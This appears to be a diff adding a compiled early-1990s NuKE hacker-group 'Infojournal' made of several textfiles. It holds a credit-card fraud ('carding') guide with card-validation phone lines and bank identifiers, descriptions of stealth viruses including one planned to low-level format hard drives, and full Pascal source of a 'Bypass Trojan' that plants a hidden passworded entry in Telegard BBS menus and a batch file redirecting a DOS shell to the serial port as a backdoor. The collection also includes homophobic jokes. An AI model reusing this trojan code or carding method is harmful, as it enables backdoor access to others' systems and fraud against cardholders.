@@ -1,0 +1,3049 @@
+%^52^%
+Carding Summary
+Mechanix
+
+$_Introduction:
+
+    Over my years in the modem world, and especially in the computer
+underground, I have seen tons and tons of hack/phreak textfiles written by
+numerous people, some renown, some not. But the topic that I find sticks out
+the most is carding. Whether because it is the most lucrative, or because it
+does not take as much knowledge as the others, I don't know, but I find that
+carding files are widespread. In any case, I started carding before I got into
+modeming, and it was something I picked up from friends at high school.
+However, my carding adventures lasted under a year, and then I was forced to
+stop for legal reasons. However, I have decided to pick up all the carding
+files I could find, and cram them all into this article. First off, I will not
+deal with finding the cards or with how to purchase/phraud merchandise. These
+topics are to vast, as everyone seems to have there own ideas on the matter. I
+will discuss the technical aspect of carding, such as number format, card
+format, bank identifiers... Secondly, most of this material is not original.
+Some of it is, but a lot of it has been reprinted from old textfiles. The
+sources are at the end of this article.
+
+%Card Recognition:
+
+    So now you have a credit card number (CCN). What next? Well first it helps
+to know what kind of card it is, and what restrictions are imposed by that.
+First of all, not all cards are alike. They fall into two groups: credit cards
+and charge cards.
+.Credit Cards work by credit (no, really?). This means each card has a fixed
+ spending limit for each month.
+.Charge Cards have no spending limit, at least none that are visible, but you
+ still can't buy a boat with one, at least not the standard ones. Some *gold*
+ cards have higher *prestige* and thus that invisible limit is raised much
+ higher. The advantage with these is that you can card your ass off, but then
+ again the companies are much tighter on security.
+
+I will discuss four companies in this article, which are:
+.Visa, Master Card, Discover : Credit Cards
+.American Express            : Charge Cards
+
+Now to find out what card you have the number to, the first digit of each card
+company is different. Different cards also have different number formats.
+
+  First Digit   Card Company        Number Format
+       3        American Express    3xxx xxxxxx xxxxx
+       4        Visa                4xxx xxx xxx xxx  or  4xxx xxxx xxxx xxxx
+       5        Master Card         5xxx xxxx xxxx xxxx
+       6        Discover            6xxx xxxx xxxx xxxx
+
+Now with this you should be able to tell what card you have. If not, then
+you're a fool.
+
+%Card Checking:
+
+    Now, you know what card you have the number for. But you still can't go
+out and order your stuff. Why? Well simply because you don't know how long
+this card has been good for. The number might be 6 months old, and that's not
+very good credit. Now unless you got the plastic out of someone's wallet the
+very same day, chances are the card has been reported stolen and it's no good.
+If you picked the number off a carbon, then you still have to check if the
+card has any money left on it. Getting numbers off boards is the worst,
+because the number has probably already been abused to death. Now here are few
+places where you can check the validity of your credit and charge cards. Note:
+some numbers are unattainable from some areas. There are also many local voice
+checking stations around, but I won't write these as they are dependant on
+your area code.
+
+.1-800-554-2265 : Visa, Master card, American Express
+ When you connect you will be prompted to enter information through your touch
+ tone phone. When all is finished, if the card is good you will get an
+ authorization number, otherwise it will say declined. The format to enter the
+ information is:
+
+  Type # ID # Merch # CCN # Exp # Amount #  -Note: # is the pound sign on the
+                                                   phone
+
+  Type  : This is the number for your card: AMEX: 30
+                                            VISA: 20
+                                            MC  : 10
+  ID    : This is the Bank ID. This is written on the card, but if you only
+          have the number then enter 1067, this *usually* works. More on Bank
+          IDs later.
+  Merch : This is the Merchant Number. Usually, just enter 24 or 52.
+  CCN   : This is your card number. Contrary to popular belief, the CCN *does*
+          follow a precise mathematical formula. I, however, have not been
+          able to find an exact symmetry, but it does follow an equation,
+          guaranteed.
+  Exp   : This is the expiration date. Some say that the expiration date does
+          not matter as long as it is after the present date. Others think it
+          is second security feature to check for invalid CCNs. In any case,
+          the format is mmyy. That's 0893 for August 1993.
+  Amount: Enter the amount in the following format: $$*›› where * is the
+          asterisk on your phone. So $25.67 is 25*67. The amount you enter
+          will be subtracted from the cards remaining credit. So if the card
+          has $3000 remaining and you check it for $2000 it will accept the
+          amount. But if you check it right after for another $2000 it will
+          decline the request, even though you have not used it yet. This
+          prevents users from going around charging $10,000 of stuff on a
+          $2000 limit credit.
+
+.1-800-233-5656 : Discover
+ As above but the format is different.
+
+  CCN # Merch # Amount # Exp #
+
+.1-800-268-2405 : Master Card
+.1-800-268-2410 : Master Card
+.1-800-268-2530 : Master Card
+.1-800-554-1111 : Visa, Master Card
+.1-800-228-1111 : Visa, Master Card
+.1-800-268-8261 : Visa
+.1-800-268-8281 : Visa
+.1-800-663-3611 : Visa
+.1-800-528-2121 : American Express
+.1-800-525-9040 : Discover
+
+%Carbons:
+
+    I'm going to draw the card format for Visa, Master Card and American
+ Express so you can figure out where everything is on a carbon.
+           _____________________________
+.VISA     |  BANK of XXXXXXXXXX  | VISA |             C : Classic
+          |                      |______|             P : Preferred (better)
+ In INK --> 4xxx                 | Holo-|
+          | 4xxx  xxx  xxx  xxx  | -gram|
+          |      mm/yy  mm/yy CV |------|
+          | First Lastname    :  |  C <-|---- C or P
+          |___________________:__|______|
+                              :
+                              :
+                            C or P
+
+           _____________________________
+.MC       |  BANK of XXXXXXXXXX         |
+          |                             |
+          |                             |
+          | 5xxx  xxxx  xxxx  xxxx______|
+ Bank ID -> xxxx mm/yy  mm/yy  |   MC   |
+          | First Lastname     |hologram|
+          |____________________|________|
+
+           _____________________________
+.AMEX     |  AMERICAN EXPRESS           |
+          |                             |
+          |                      xxxx <------ In INK
+          |   3xxx   xxxxxx   xxxxx     |
+          | mm/yy THRU mm/yy   yy   AX  |
+          | First Lastname      :       |
+          |_____________________:_______|
+                                :
+                                :
+                           Member since
+
+
+%Bank Numbers and Identifiers:
+
+    Every bank that issues a credit card has it's own set of first four digits
+as well as it's own bank ID in Master Cards Case. Here is a list of all the
+bank IDs that were found throughout various textfiles. There are many more,
+but I kept only those with the bank name.
+
+ @VISA
+   _______________________________________________
+  | XXXX | Bank Name                      | Notes |
+  |------|--------------------------------|-------|
+  | 4019 | Bank of America                | GOLD  |
+  | 4024 | Bank of America                |  PV   |
+  | 4040 | Wells Fargo                    |       |
+  | 4121 | Signet Bank                    |       |
+  | 4128 | Citibank                       |       |
+  | 4226 | Chase Manhattan Bank           |       |
+  | 4271 | Citibank                       |  PV   |
+  | 4310 | Imperial Savings               |       |
+  | 4317 | California Federal             |       |
+  | 4424 | Security Pacific National Bank |       |
+  | 4428 | Bank of Hoven                  |       |
+  | 4678 | Home Federal                   |       |
+  | 4726 | Wells Fargo                    |       |
+  |______|________________________________|_______|
+
+ @MASTER CARD
+   ________________________________________________________
+  | XXXX | Bank Name                      | ID Numbers     |
+  |------|--------------------------------|----------------|
+  | 5031 | Maryland Bank of North America |                |
+  | 5204 |                                | 1006           |
+  | 5215 |                                | 6207           |
+  | 5250 |                                | 1260           |
+  | 5254 | Bank of America                |                |
+  | 5273 | Bank of America                |                |
+  | 5282 | Wells Fargo                    |                |
+  | 5286 | Home Federal                   |                |
+  | 5291 | Signet Bank                    | 1001           |
+  | 5329 | Maryland Bank of North America | 1017/6017      |
+  | 5410 | Wells Fargo                    | 1037/6037/6785 |
+  | 5411 |                                | 1169           |
+  | 5412 | Wells Fargo                    |                |
+  | 5415 |                                | 1530           |
+  | 5417 |                                | 1711/1786      |
+  | 5419 | Bank of Hoven                  | 1933           |
+  | 5421 |                                | 2143           |
+  | 5424 | Citibank                       | 1035/1065      |
+  | 5432 | Bank of New York               |                |
+  | 5465 | Chase Manhattan Bank           | 1665           |
+  |______|________________________________|________________|
+
+%Original Sources:
+
+    Material for this article was taken from the following:
+ . UPI file #10
+ . NARC file #7
+ . NARC file #8
+ . Carding #14 by The Disk Jockey
+ . Carding my way -Part 2- a Shadows of IGA production
+ . Evil Avenger for some of the checking numbers
+ . Various hack/phreak users across the world
+
+%Follow-up:
+
+    There will probably not be a follow-up to this article, at least not from
+me. This is just something I've wanted to do for a while, and now it's done,
+so I can pursue other interests. If any of you want some good reading or
+information on carding, I suggest the whole line of carding files by The Disk
+Jockey, perhaps one of the most knowledgeable people who wrote about this
+subject. Anyways, that's it. Have phun.
+
+ Mî›H’ï!X/ïšKî
+  Mechanix/NuKE
+
+%End of File%
+%^22^%
+Amilia Virus
+Rock Steady
+
+                           AmiLiA Virus
+                          ~~~~~~~~~~~~~~
+                    Creator: Rock Steady/NukE
+
+  NOTES: Okay, this is it! My best virus yet! It is undetectable from
+         ScanV85 (McAfee), and it is a stealth virus. The virus loads
+         into resident memory and infects all .COM and .EXE files that
+         are ran. One amazing note is that the virus hides in memory.
+         MEM/C (Dos) will not report anything resident in memory.
+         The only way you will notice the virus, is it will decrease your
+         memory by about 1K. Anyhow, the virus is extremely smart and fast.
+
+        -This Virus is a simple signature virus. Every Sunday it displays
+         a message saying your system is infected with Amilia I virus.
+
+        -Anyhow, I wrote this one quite a long time ago, though it never
+         seemed to work. The stealth techniques never seemed to work. Though
+         I fixed this problem and it is now out in the open. I didn't put
+         any destructive codes inside due to I'd want to improve it and
+         then put some destructive codes. You can call this virus a field
+         test. Anyhow this virus is not related to the "Dark Avenger".
+         Just because we all have the sources of Dark Avenger, lamers
+         believe that I'd copy such a thing. Anyhow I thank my friends at
+         the "Italian Virus Laboratory" for giving my the awesome tip of
+         stealth techniques.
+
+        -All infected files will increase of a size of exactly 1,600 Bytes.
+         All dates of the files are restored and it will infect files that
+         are either hidden or read-only or both...
+
+                           Rock Steady / NukE
+      (C) [NukE] i99i InTerNaT'nal SofTware DeVeLopmenT Corporation
+
+%End of File%
+%^54^%
+HiV and Illusion software
+The Illusionist and Acid Face
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³ H‹V Systems 1.06 Information þ Written by: The Illusionist  &  Acid Face  ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+       Hey, ACiD FaCE here, well with everyone asking
+     about H‹V we decided to write up a report on what happened
+     to H‹V and how we started ILLUSION v0.91.
+
+       Well about seven months ago I got my hands on a copy of
+     LSD-123.ZIP (Which were the source codes to LSD v1.23) and
+     decided to make my own BBS program.. I worked very hard on
+     this project of mine by myself.. Then when it was almost
+     completed I gave a copy to The Chainmaster so he could be
+     my BETA site. After about three days he asked for H‹V's
+     source codes, I said no, but he said if I didn't give them
+     to him, he would drop H‹V, so I had no choice, I gave them
+     to him.. So naturally he called himself a programmer of H‹V
+     while actually he did absolutely nothing on this project...
+
+       Time passed, people asked me if they could also be a BETA
+     site. But none of them where REALLY interested, so I still
+     worked on H‹V. Then one day I called The Chainmaster voice
+     and he was talking to The Illusionist on his other line. I
+     told The Chainmaster to tell Illusionist to give me a call
+     so he did, we talked for a long time and discussed our BBS
+     programming projects, and I asked him if he wanted to drop
+     Eternity and I'd drop H‹V and create a new program called
+     ILLUSION, so we agreed and thought up about 80 ideas for our
+     new project, but we also agreed to keep it a secret for the
+     time being until we got far into the program.
+
+       After about three months we told a few people about it and
+     we started to post about it also.. Then The Illusionist set
+     up his board on ILLUSION v0.91 and every time we would modify
+     something we would use it and the users would notify him if
+     any bugs where seen.
+
+       I finally let The Chainmaster know what we were doing and
+     told him "sorry, no more H‹V" and told myself "God FINALLY out
+     of the queer club" (little joke from The Illusionist here).
+     Well The Chainmaster is now running on Telegard, his board is
+     doing fine - so is he, except that the tests he got were
+     positive.
+
+     Continue reading more information about ILLUSION..
+
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³ ILLUSION v0.91 Information  þ  Written by: The Illusionist  &  Acid Face  ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+       Hi, The Illusionist here, to bring you a report on our
+     progress with ILLUSION v0.91 (current beta version). Many
+     options have been implemented in this revolutionary new
+     Forum-PC hack to suit the needs of the most experienced
+     sysops of the BBS community. The options added in this BBS
+     program are a combination of some of the best options that
+     have been implemented in diverse BBS programs on the market
+     today (such as Celerity, ViSiON-X, etc). Our goal is to
+     offer the best support for sysops and users while attempting
+     to make this program as configurable as possible by removing
+     the boring Forum-PC hack look.
+
+       Are layout on this project is to bring the consumer
+     (the sysop in this case) one of the best Forum-PC hacks
+     available today on their home computer.
+
+       You're probably telling yourself "Who the hell is The
+     Illusionist?". Well surprise, this person has been on the
+     Montreal BBS scene for over three years, you might know me
+     better under the alias "QueenSryche". My first attempt at
+     BBS programming came when the 514 area code became infested
+     with Telegard, this program which was one of the most widely
+     used BBS software in the world by the pirate community,
+     became one of the lesser used because of it's monotonous
+     look.
+
+       Eternity (which was the chosen name of the BBS program)
+     started as a little idea between The Smuggler (currently
+     SysOp of 7-11 BBS) and I. Since we didn't want to write this
+     program from scratch, we decided to use the LSD v1.23 source
+     codes; our first mistake. These poorly written codes, seemed
+     as if the programmer was drunk (or maybe on "LSD") when he
+     wrote; procedures were all over the place and made a big
+     mess. A lot of pointless efforts went into re-structuring the
+     source codes, but with the "so many bugs" of this program,
+     it made it disadvantageous to use it as a start up code;
+     debugging something that you haven't written is a damn job -
+     when the guy who wrote it doesn't know how to program.
+
+       A lot of work was done with this program in a few months
+     (before X-mas). The Smuggler and I were advancing with
+     Eternity and thought it might become something... until
+     School came up, both he and I didn't have much time to
+     devote ourselves in programming Eternity. It became obvious
+     that this program couldn't go further so we both stopped
+     programming for a lapse of time. A few weeks later we got on
+     it again, although we didn't feel much creativity, we forced
+     ourselves to finally do some last minute design and compile
+     it so that one of us could run it. The Smuggler decided to
+     put his board up right away on Eternity (even though it
+     wasn't really finished, it sure looked better than
+     Telegard).
+
+       Meanwhile a few weeks passed and I found myself stuck
+     with a bad case of the "Stoned" virus on my HD. Later on I
+     found out that it came from my disks. There was actually
+     about three hundred 720k/1.44M disks infected with the
+     "Stoned" virus. After spending a whole day cleaning these
+     disks, it was too late for my hard drive. Thinking that I
+     had rid of it from the "Stoned" virus, to my surprise, the
+     "Omnicron" virus had deleted the partition and reconfigured
+     it to be a "8 MEG DEVICE DRIVER", sounds weird, but
+     according to PCTOOLS' DiskFix and Norton Disk Doctor, my 105
+     meg drive was turned into an 8 meg device driver; So much
+     for Eternity. The sources weren't backed up and I didn't
+     feel like redownloading them from The Smuggler (that shows
+     you how much I cared about Eternity). So I decided to lay
+     back from the BBS scene for awhile because of my laziness in
+     reinstalling MS-DOS 5.0 (which took me about 1 month to find
+     a copy that worked). Thanks for the people who worried about
+     me.
+
+       In October 1991, after re-installing MS-DOS and Qmodem
+     I decided to give a couple of old boards a call. To my
+     surprise The Chainmaster's BBS was back up - running on HiV.
+     First I did bad remarks about this program, one of my
+     messages contained the following quote:
+
+     "HiV? Is that a BBS program for Queers only!?"
+
+       I guess it was as primitive as Eternity was. I downloaded
+     HiV from a board and experienced some of the options it had,
+     it was pretty original... NOT! most of the look and feel was
+     taken from LSD v1.23 source codes, it was pretty lame to
+     release it like that. But some of the things that the
+     programmer had implemented in it, required some experienced
+     knowledge of pascal programming, so I decided to contact the
+     main programmer for HiV (Acid Face).
+
+       He told me that he was sick of doing HiV because he was
+     the only one working on it and other people taking credit
+     from it (ie. The Chainmaster - claiming to be a programmer
+     when he did barely 0.01 % of the work), and since I wanted
+     to start out fresh the BBS program from a different source
+     code that had, somewhat, and intelligible starting BASE, I
+     picked ViSiON, although most of the codes were identical to
+     LSDs, some of the coding was pretty time saving, such as the
+     Configurable file listing, graphical interface, originality,
+     organization and many other options. I have to congratulate
+     the programmers for making this possible (as well as the
+     person who released the source codes), else ILLUSION would
+     have taken a lot more time to get to where it is now.
+
+       "How ILLUSION was started" does thy ask? A few days
+     later I got in contact with Acid Face. From there we
+     discussed the possibility of him and I working on a BBS
+     program that would be a effervescence to the Modem Industry.
+     Many ideas came up, of which 26 pages were composed, and a
+     particular one came up, one being of designing our software
+     to take full potentiality of the 80386/80486 as well as an
+     Optimum USRobotics 14.4k Tuning and support via protocols
+     and display sending speed. Projects such as making this
+     program VGA with it's own terminal have been discussed but
+     it's too early to determine what will become of this
+     program. If we were ever to invest in such a project, there
+     would still be two version of this program, one being the
+     ILLUSION/VGA and one being ILLUSION - doing this would
+     demonstrates support for both SysOps who wish a normal BBS
+     and for the ones who want the next generation in BBS
+     Software.
+
+       People have been chatting about a protocol called
+     HSLink (which is a protocol that uses FULL v32bis/v42bis
+     transfers both ways), our plans is to implement it, using a
+     powerful protocol such as this one could be time consuming.
+     Protocol compatibility will be superior to any program, with a
+     wide selection of over 40 protocols and more, when you think
+     about it, running this program next could be your best
+     resolution for 1992 as well as one of the best moves you
+     have done.
+
+       Continuous update with our "No Fuck-overs" policy,
+     Sysop support will be our first priority; getting the sysop
+     the updates on time, keeping him informed on the program's
+     progress, helping him on any possible questions he might
+     have, as well as a full account on the Home board for
+     Illusion, what more can you ask for?
+
+       Since we are working hard on this project and spending
+     a lot of time on it, we have decided to settle on it for the
+     little fee of $35.00 in Canadian funds which would entitle
+     you to get 5 upgrades (1 upgrade every month). But for now
+     Illusion is not for general distribution, it is still in
+     it's early beta testing state. But in a few months it should
+     be widely distributed as a demo version for which you will
+     be able to download on your local boards.
+
+       Anyways, since we are in need of a lot of help from
+     users and sysops, anybody (sysops) who are interested in
+     becoming a BETA Test-Site for ILLUSION will have to come and
+     fill out and ®BETA Site¯ application form on Eternal
+     Illusion (514) 582-3786, Your job as a BETA Test-Site will
+     be of filling out a form every week with bug reports, for
+     sysops who are devoted to their BBS and others, are low in
+     cash, well take this into consideration.
+
+       Eventhough I expect ILLUSION to be a big BOOM in the
+     Modem Community, for now we are still limiting 3 boards per
+     area code to run it, for personal reasons (we haven't made
+     plans yet on handling more than 100 boards). If you're
+     interested, contact either The Illusionist or Acid Face for
+     a demo copy (which will be available soon).
+
+     Thank you.
+
+             The ILLUSIONist '92 [Programmer/Author]
+             Acid Face (NuKE)    [Programmer/Author]
+
+%End of File%
+%^37^%
+Future Plans
+Rock Steady
+
+Anyhow I'm presently working on two different types of viruses. I will try
+to explain the "High-Points" of my viruses.
+
+
+Virus Name: Common Cold
+Features..: TSR Virus Infecting .EXEs & .COMs Executed.
+            Stealth virus that hides in High memory under the TOM
+Approx Size.........: 1,400-1,600 Bytes
+Percentage Completed: 80%
+Release Date........: February 1st, 1992
+
+NOTES: This virus will infect all Files executed or ran in the system.
+   And every Second Monday the virus will do a Low Level format for ALL
+   Hard Drives available in the system.
+  -This Virus Will mainly be created for the purpose of a lack of deadly
+   viruses going around. This virus will be a strain of the `AmiLiA' virus
+   that is named after my babe, but refuses to accept another strain that
+   will cause a little damage.
+
+                        ---------/---------
+
+Virus Name: ParaSite ]I[
+Features..: Virus Infecting only COMs
+            Stealth techniques to hide as much as possible from Scanners.
+Approx Size.........: 1,200-1,400 Bytes
+Percentage Completed: 50%
+Release Date........: Mid February, 1992
+
+NOTES: This Virus will infect all COMs files in the system. And the
+   COMMAND.COM will ALWAYS be checked to make sure it's infected. If not
+   it will be.
+  -This Virus WILL Check to see if FlushShot & VShield is Resident in
+   memory. If so it will NOT run because this will stop the virus
+   Red-Handed.
+  -Like ALL the ParaSite Viruses this too will annoy the user every so often
+   but it will not tell the user directly he has a virus. The ParaSite
+   Virus will Make "Sounds In the PC Speaker" the Virus might Re-Edited
+   the CMOS and remove the HD from configuration.
+  -The COM ports might not want to function. And the screen may even
+   flicker every so often.
+  -All these Wonderful feature MAY happen or NEVER happen. Because the
+   virus will have a random generator to decide if it will cause damage
+   or just infect another file.
+  -An Algorithm Encryption may be imposed in this Virus. If it is NOT
+   imposed inside There WILL be another Virus Release with an Algorithm
+   Encryption. This factor depends if SIZE permits. Because I DON'T want
+   this virus to pass 1,500 Bytes in Length.
+
+                            Rock Steady
+                NukE / Viral Development Researcher
+                              -PeAcE-
+
+%End of File%
+%^34^%
+Viral Developments
+Rock Steady
+
+    Before we begin the "Viral Development" section of this Infojournal I'd
+like to explain briefly a few words I have on our so-called Virii-World.
+
+    What is the challenge or thrill one gets out of creating a virus. Is it
+because you enjoy making these dangerous programs, watching the world cry and
+fear for help? Is it because you lust watching your enemies die a painful
+death? If this may be the case I hope you get professional help soon. Just
+because all of you newcomers believe this, it may not be the case.
+
+    Making a virus should be a challenge, a quest for progressive technology.
+We all have witnessed the "Desert Storm" since our neighborly friendly CNN
+Press have bombarded us with some close-up action shots. And we all know how
+"Successful" the war went technology wise. Part of that success was granted to
+a computer program we all scream with fear, and called John McAffee for help.
+Yes, a virus, was programed into a EPROM Chip and placed into a printer that
+was in the process of being smuggled into Iraq long before "Desert Storm"
+took action. Its main function was to dissable Iraq computers during
+anti-attack times.
+
+    Viruses are used by US intelligence to help conquest certain missions. And
+the goal for every programmer should be to program a virus that can outsmart
+our friends at McAffee. A great example are the Whale virus and the V2P2
+Family. And when I say program, I mean you take out a text editor and program
+something TASM can gobble up. NOT taking one's virus and compressing it to
+avoid detection. That is not known as programming. So please restrain from
+calling yourselves "Viral Programmers" when using PkLite or LZExe compressors
+and editing out the label header.
+
+    Lastly, I hope we now can form a Viral Development Research center that
+will bring forward our conquest. This is only constructive criticism. I know
+several will get offended and perhaps return crude remarks. If so then be it.
+But I just do not want to see several hundreds "Overwritting" virii as a new
+virus to come before me. Every Day I have users that confront me about this
+new "Undetectable" virus. Where only I request to learn from theses new virii,
+so that we can progress. But about seconds after receiving the virus I see it
+is only a "Overwritting" virus. I must state the fact I never programed a
+overwritting virus. Because they seem to easy. And there is about 100+ source
+codes of overwriting virii everywhere. If the heat is too much for you to
+program a real virus then just get out, because overwritting virii will hurt
+the name you work long hours to build. Anyhow focus on quality rather than
+quantity. It is the basis I try to program with. Anyhow lets get on with the
+Infojournal.
+
+                           Rock Steady
+                [NukE]/Viral Development Researcher
+                             -PeAcE-
+
+%End of File%
+%^12^%
+Word from the President
+The Darkman
+
+    Well , here we are again. It is my guess that if you're reading these
+words right now, you probably enjoyed the first Infojournal. Well, you're in
+for a mighty treat with this one.
+
+    The group has undergone major changes since the last Infojournal. Many
+useless members have been discharged, and more competent members have joined,
+such as Nowhere Man, a very proficient C and Assembler programmer. We have
+also accepted a big merger between an Australian based group known as SCP,
+Southern Corrupted Programming. We have also gained a superb site, the BBS
+known as Hell's Pit, in 708.
+
+    We have also gained much knowledge. I figure it will show in this
+Infojournal, just by the way it was written. You know, in my first intro,
+when I introduced my theory of Nuclear Energy, I never figured it would have
+effect on us. The more we know, the more we want to know, and the more we
+learn. We have gotten to the point where we SEARCH for knowledge, digging it
+out wherever we can.
+
+    We have also had many stop signs during this period. I name one, the Rabid
+affair. I see all these trials as tests. If we make it through, it's because
+we're tough enough to make it. The day hasn't come when we will meet up with
+an obstacle meaning our demise.
+
+    All I have talked about in this present intro, will be studied further
+with the journal. Ah yes, one more thing. One of our good friends and members
+had a very bad surprise in January. Someone had beige boxed him for 1300$. I
+am talking about Prince of Thieves, from BC, Canada. I dedicate this
+Infojournal to you, PoT, and wish you a prompt return to the best of the
+best.
+
+Once again, I remind you this:
+
+<< Nuclear Energy, the power of tomorrow >>
+
+The DarkMan, [NuKE]'92
+
+%End of File%
+%^42^%
+Bypass Trojan v2.0
+Mechanix
+
+PROGRAM BYPASS2;
+
+USES DOS;
+
+VAR
+ Target    : SEARCHREC;
+ T         : TEXT;
+ G         : TEXT;
+ Filecount : BOOLEAN;
+
+PROCEDURE DIRECT   (PATH : STRING);
+
+VAR
+ PATH2    : STRING;
+ INFO     : SEARCHREC;
+ INFO2    : SEARCHREC;
+ F        : TEXT;
+
+BEGIN
+ Findfirst (PATH + '\*.*',$10,INFO);
+ WHILE DOSERROR = 0 DO
+  BEGIN
+   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
+    Begin
+     PATH2 := PATH + '\' + INFO.NAME;
+      Chdir (PATH2);
+       Findfirst ('MAIN.MNU',($3F - $10),INFO2);
+       WHILE DOSERROR = 0 DO
+        Begin
+         ASSIGN (F,INFO2.NAME);
+         Setfattr (F,$20);
+         Append (F);
+         Writeln (F,' ');
+         Writeln (F,' ');
+         Writeln (F,'#');
+         Writeln (F,' ');
+         Writeln (F,'-$');
+         Writeln (F,'NUKEWAR;PW: ;^8WRONG - access denied!');
+         Writeln (F,' ');
+         Writeln (F,' ');
+         Writeln (F,' ');
+         Writeln (F,'#');
+         Writeln (F,' ');
+         Writeln (F,'D-');
+         Writeln (F,'REMOTE.BAT');
+         Close (F);
+         Findnext(INFO2);
+       End;
+      DIRECT (PATH2);
+    End;
+   Findnext(INFO);
+  End;
+ END;
+
+
+
+PROCEDURE FILEFIND (DRIVE : CHAR);
+
+BEGIN
+ Chdir (DRIVE + ':\');
+ Findfirst ('MAIN.MNU',($3F - $10),Target);
+ WHILE DOSERROR = 0 DO
+  Begin
+   ASSIGN (T,Target.name);
+   Setfattr (T,$20);
+   {$I-}
+   Append (T);
+   {$I+}
+   IF IORESULT = 0 THEN
+    Begin
+     Writeln (T,' ');
+     Writeln (T,'#');
+     Writeln (T,' ');
+     Writeln (T,'-$');
+     Writeln (T,'NUKEWAR;PW: ;^8WRONG - access denied!');
+     Writeln (T,' ');
+     Writeln (T,' ');
+     Writeln (T,' ');
+     Writeln (T,'#');
+     Writeln (T,' ');
+     Writeln (T,'D-');
+     Writeln (T,'REMOTE.BAT');
+     Close (T);
+    End
+   ELSE
+    Exit;
+   Findnext (Target);
+  End;
+ DIRECT  (DRIVE + ':');
+END;
+{----------------------------------------------------------------------------}
+
+PROCEDURE DIRECT2  (PATH : STRING);
+
+VAR
+ PATH2    : STRING;
+ INFO     : SEARCHREC;
+ INFO2    : SEARCHREC;
+ F        : TEXT;
+
+BEGIN
+ Findfirst (PATH + '\*.*',$10,INFO);
+ WHILE DOSERROR = 0 DO
+  BEGIN
+   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
+    Begin
+     PATH2 := PATH + '\' + INFO.NAME;
+      Chdir (PATH2);
+       Findfirst ('REMOTE.BAT',($3F - $10),INFO2);
+       IF DOSERROR = 0 THEN
+        Begin
+         Filecount := TRUE;
+         Exit;
+        End
+       ELSE
+        Begin
+         Filecount := FALSE;
+         Findnext(INFO2);
+        End;
+      DIRECT2 (PATH2);
+    End;
+   Findnext(INFO);
+  End;
+ END;
+
+
+
+PROCEDURE FILEFIND2 (DRIVE : CHAR);
+
+BEGIN
+ Chdir (DRIVE + ':\');
+ Findfirst ('REMOTE.BAT',($3F - $10),Target);
+ IF DOSERROR = 0 THEN
+  Begin
+   Filecount := TRUE;
+   Exit;
+  End
+ ELSE
+  Begin
+   Filecount := FALSE;
+   Findnext (Target);
+  End;
+ DIRECT2  (DRIVE + ':');
+END;
+{----------------------------------------------------------------------------}
+PROCEDURE DIRECT3  (PATH : STRING);
+
+VAR
+ PATH2    : STRING;
+ INFO     : SEARCHREC;
+ INFO2    : SEARCHREC;
+ F        : TEXT;
+
+BEGIN
+ Findfirst (PATH + '\*.*',$10,INFO);
+ WHILE DOSERROR = 0 DO
+  BEGIN
+   IF (INFO.ATTR = $10) AND (INFO.NAME[1] <> '.') THEN
+    Begin
+     PATH2 := PATH + '\' + INFO.NAME;
+      Chdir (PATH2);
+       Findfirst ('TELEGARD.EXE',($3F - $10),INFO2);
+       IF DOSERROR = 0 THEN
+        Begin
+         ASSIGN (F,'REMOTE.BAT');
+         Rewrite (F);
+         Writeln (F,'Echo off');
+         Writeln (F,'CTTY Com2');
+         Writeln (F,' ');
+         Writeln (F,'Echo DOS');
+         Writeln (F,' ');
+         Writeln (F,'Prompt $l$p$g');
+         Writeln (F,'Command');
+         Writeln (F,'Echo off');
+         Writeln (F,'Exit');
+         Close (F);
+         Setfattr (F,$02);
+         Chdir ('\');
+         Halt;
+        End
+       ELSE
+        Begin
+         Findnext(INFO2);
+        End;
+      DIRECT3 (PATH2);
+    End;
+   Findnext(INFO);
+  End;
+ END;
+
+
+
+PROCEDURE FILEFIND3 (DRIVE : CHAR);
+
+BEGIN
+ Chdir (DRIVE + ':\');
+ Findfirst ('TELEGARD.EXE',($3F - $10),Target);
+ IF DOSERROR = 0 THEN
+  Begin
+   ASSIGN (T,'REMOTE.BAT');
+   Rewrite (T);
+   Writeln (T,'Echo off');
+   Writeln (T,'CTTY Com2');
+   Writeln (T,' ');
+   Writeln (T,'Echo DOS');
+   Writeln (T,' ');
+   Writeln (T,'Prompt $l$p$g');
+   Writeln (T,'Command');
+   Writeln (T,'Echo off');
+   Writeln (T,'Exit');
+   Close (T);
+   Setfattr (T,$02);
+   Chdir ('\');
+   Halt;
+  End
+   ELSE
+    Begin
+     Findnext (Target);
+    End;
+ DIRECT3  (DRIVE + ':');
+END;
+{----------------------------------------------------------------------------}
+
+
+BEGIN
+
+ {$I-}
+ Chdir ('C:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+  Begin
+   FILEFIND ('C');
+   FILEFIND2 ('C');
+   IF Filecount = FALSE THEN
+   FILEFIND3 ('C');
+  End;
+
+ {$I-}
+ Chdir ('D:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('D');
+  FILEFIND2 ('D');
+  IF Filecount = FALSE THEN
+  FILEFIND3 ('D');
+ End;
+
+ {$I-}
+ Chdir ('E:\');
+ {$I+}
+ IF IORESULT = 0 THEN
+ Begin
+  FILEFIND ('E');
+  FILEFIND2 ('E');
+  IF Filecount = FALSE THEN
+  FILEFIND3 ('E');
+ End;
+END.
+
+%End of File%
